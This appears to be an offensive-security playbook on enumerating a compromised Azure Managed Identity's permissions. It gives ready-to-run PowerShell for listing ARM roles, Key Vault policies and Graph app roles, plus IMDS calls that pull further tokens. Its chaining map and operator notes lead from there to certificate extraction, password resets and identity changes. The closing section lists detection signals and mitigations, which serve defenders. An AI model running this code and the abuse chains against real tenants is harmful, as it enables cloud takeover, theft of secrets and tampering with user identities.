## Overview

A Managed Identity token carries exactly the permissions that were assigned to that identity in Azure. The token itself reveals who the MI is — the `object_id` and `client_id` claims identify the principal — but not what it can reach. Enumerating the MI's RBAC assignments, Key Vault access policies, and Graph app roles maps the full blast radius before committing to any specific abuse path.

MI permissions span three independent control planes that must be checked separately: ARM (resource management), data planes (Key Vault, Storage), and Entra ID (Graph app roles). An MI with no ARM RBAC may still have Key Vault data plane access. An MI with Storage permissions may have no visibility into ARM at all.

## Preconditions

| What's needed | How to get it |
|---|---|
| MI access token for ARM | IMDS request with `resource=https://management.azure.com/` |
| MI access token for Graph | IMDS request with `resource=https://graph.microsoft.com/` |
| MI object ID | From the IMDS token response (`object_id` claim) |
| MI client ID | From the IMDS token response (`client_id` claim) |

## Step 1 — Enumerate ARM RBAC Assignments

```powershell
$miObjectId = "<MI_OBJECT_ID>"   # from IMDS token response

# Tenant-wide RBAC assignments for this MI
$uri = "https://management.azure.com/providers/Microsoft.Authorization/roleAssignments" +
       "?api-version=2022-04-01&`$filter=principalId eq '$miObjectId'"

$assignments = (Invoke-RestMethod -Method GET -Uri $uri `
    -Headers @{ Authorization = "Bearer $ARMToken" }).value

$assignments | ForEach-Object {
    $roleDef = Invoke-RestMethod -Method GET `
        -Uri "https://management.azure.com$($_.properties.roleDefinitionId)?api-version=2022-04-01" `
        -Headers @{ Authorization = "Bearer $ARMToken" }
    [PSCustomObject]@{
        Scope    = $_.properties.scope
        Role     = $roleDef.properties.roleName
        RoleType = $roleDef.properties.type   # BuiltInRole or CustomRole
    }
} | Format-Table
```

High-value ARM roles to flag immediately: `Owner`, `Contributor`, `User Access Administrator`, role-specific write permissions on sensitive resource types.

## Step 2 — Enumerate Key Vault Access

Key Vault access is either RBAC-based (newer) or access policy-based (legacy). Check both:

```powershell
# RBAC-based: the MI object ID appears in role assignments on the vault
# Already covered by ARM RBAC enumeration above — filter scope for vault paths

# Access policy-based: look for the MI's object ID in vault access policies
$vaults = (Invoke-RestMethod `
    -Method GET `
    -Uri "https://management.azure.com/subscriptions/<SUB_ID>/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" `
    -Headers @{ Authorization = "Bearer $ARMToken" }).value

$vaults | ForEach-Object {
    $vault = Invoke-RestMethod -Method GET `
        -Uri "https://management.azure.com$($_.id)?api-version=2022-07-01" `
        -Headers @{ Authorization = "Bearer $ARMToken" }
    $policy = $vault.properties.accessPolicies | Where-Object { $_.objectId -eq $miObjectId }
    if ($policy) {
        [PSCustomObject]@{
            Vault       = $vault.name
            Permissions = ($policy.permissions.secrets + $policy.permissions.keys + $policy.permissions.certificates) -join ", "
        }
    }
} | Format-Table
```

Key permissions to flag: `secrets/get`, `keys/sign`, `certificates/get` — these map directly to the Key Vault abuse techniques.

## Step 3 — Enumerate Graph App Roles

If the MI has Graph app roles assigned (application permissions, not delegated):

```powershell
# Check app role assignments on the MI's service principal
$uri = "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '$miClientId'"
$sp  = (Invoke-RestMethod -Method GET -Uri $uri `
    -Headers @{ Authorization = "Bearer $GraphToken" }).value

$appRoles = Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($sp.id)/appRoleAssignments" `
    -Headers @{ Authorization = "Bearer $GraphToken" }

$appRoles.value | Select-Object resourceDisplayName, principalDisplayName,
    @{n="RoleId"; e={$_.appRoleId}} | Format-Table
```

An MI with `Directory.ReadWrite.All` or `RoleManagement.ReadWrite.Directory` has broad Entra ID manipulation capabilities — treat these the same as Application Administrator or higher.

## Attack Chain by Permission Type

```
ARM RBAC: Owner/Contributor on subscription
     → Full resource control: create VMs, modify network, access any storage account
     → Use ARM token directly for resource operations

ARM RBAC: Key Vault RBAC roles (Key Vault Secrets Officer, etc.)
     → Chain to: Key Vault PFX extraction or JWT assertion technique

ARM RBAC: Storage RBAC roles (Blob Data Contributor, etc.)
     → Chain to: Storage blob enumeration or ABAC bypass technique

Key Vault access policy: secrets/get + keys/sign
     → Chain to: JWT assertion (sign without export) or PFX extraction

Graph app roles: User.ReadWrite.All or equivalent
     → Chain to: password reset, TAP issuance, group membership modification
```

## Abuse Chaining Examples

```powershell
# MI has Key Vault secrets access — extract a certificate PFX
$kvToken = Invoke-RestMethod -Method GET `
    -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" `
    -Headers @{ Metadata = "true" }
# → Feed token into Key Vault PFX extraction technique

# MI has Storage Blob read access — enumerate blobs
$storageToken = Invoke-RestMethod -Method GET `
    -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" `
    -Headers @{ Metadata = "true" }
# → Feed token into Storage blob enumeration technique

# MI has Graph access — read user data or modify identities
$graphToken = Invoke-RestMethod -Method GET `
    -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" `
    -Headers @{ Metadata = "true" }
# → Feed token into Graph enumeration or abuse
```

## Operator Notes

- Always enumerate all three planes (ARM, data, Graph) before assuming the MI has limited access. Data plane permissions are invisible in ARM role listings.
- **User-assigned MI reuse**: the same user-assigned MI can be attached to multiple compute resources. If one resource is compromised, all other resources sharing that MI can also exercise its permissions — and the MI's permissions survive the deletion of any single resource it's attached to.
- **System-assigned MI scope**: a system-assigned MI is tied to a single resource and deleted with it. But its permissions may still be extensive during the window of compromise.
- After enumerating, prioritize the abuse path with the highest privilege — Owner on a subscription is immediately more valuable than Storage read on a single account.
- MI tokens obtained via IMDS can be used from any network location — the token is a bearer credential that is not IP-bound.

## Detection / Friction Points

- Enumeration via ARM API (`/roleAssignments?$filter=principalId=...`) appears in ARM Activity Log as a `Microsoft.Authorization/roleAssignments/read` operation attributed to the MI.
- Graph app role queries appear in Entra ID sign-in logs attributed to the MI's service principal.
- Downstream resource access (Key Vault reads, Storage reads, ARM operations) is logged at each service under the MI's principal name.
- An MI performing operations it has never performed before, or accessing resources it has no documented business reason to access, is the primary behavioral anomaly signal.
- Mitigation: assign least-privilege roles to MIs; prefer user-assigned MIs for better lifecycle management; regularly audit MI role assignments; use Azure Policy to enforce constraints on MI permissions.
